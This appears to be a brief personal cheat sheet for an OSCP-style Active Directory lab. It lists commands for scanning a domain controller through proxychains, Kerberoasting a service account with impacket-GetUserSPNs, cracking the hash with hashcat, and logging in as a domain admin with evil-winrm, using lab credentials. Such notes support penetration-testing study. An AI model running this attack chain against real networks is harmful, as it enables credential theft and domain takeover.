# Active_Directory

## Tools

### BloodHound

## persistence

## Tips

1.
1. 扫描DC
proxychains nmap -sT 10.1.1.1
135、445、139、389、88、636、539
powerview

2. Bob域账号、密码
win10: c:\users\bob\desktop\secret.txt
oscp\bob : Passw0rd

3. SPN密码破解
proxychains impacket-GetUserSPNs oscp.com/bob:Passw0rd -dc-ip 10.1.1.1 -request
hash.txt: $krb$sqladmin$asdasdadasdasdadadasdasdasdasdasdasdasdasdasd

4. 密码爆破（sqladmin）
hashcat -m 13100 hash.txt rockyou.txt -O

5. 登录DC
sqladmin -> Domain admins
impacket-psexec 、impacket-smbxec、wmic、evil-winrm（5985）
proxychains evil-winrm -u sqladmin -p Passw0rd -i 10.1.1.1